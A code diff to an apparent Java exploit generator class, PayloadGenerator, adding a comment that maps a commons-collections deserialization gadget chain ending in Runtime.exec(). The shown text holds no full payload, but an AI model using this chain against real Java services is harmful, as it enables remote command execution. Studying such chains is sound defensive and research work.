@@ -9,7 +9,28 @@ import java.lang.annotation.Target;
 import java.lang.reflect.Constructor;
 import java.util.HashMap;
 import java.util.Map;
+/*
+	Gadget chain:
+		ObjectInputStream.readObject()
+			AnnotationInvocationHandler.readObject()
+				Map(Proxy).entrySet()
+					AnnotationInvocationHandler.invoke()
+						LazyMap.get()
+							ChainedTransformer.transform()
+								ConstantTransformer.transform()
+								InvokerTransformer.transform()
+									Method.invoke()
+										Class.getMethod()
+								InvokerTransformer.transform()
+									Method.invoke()
+										Runtime.getRuntime()
+								InvokerTransformer.transform()
+									Method.invoke()
+										Runtime.exec()
 
+	Requires:
+		commons-collections
+ */
 public class PayloadGenerator {
 
     public static void main(String[] args) throws Exception {
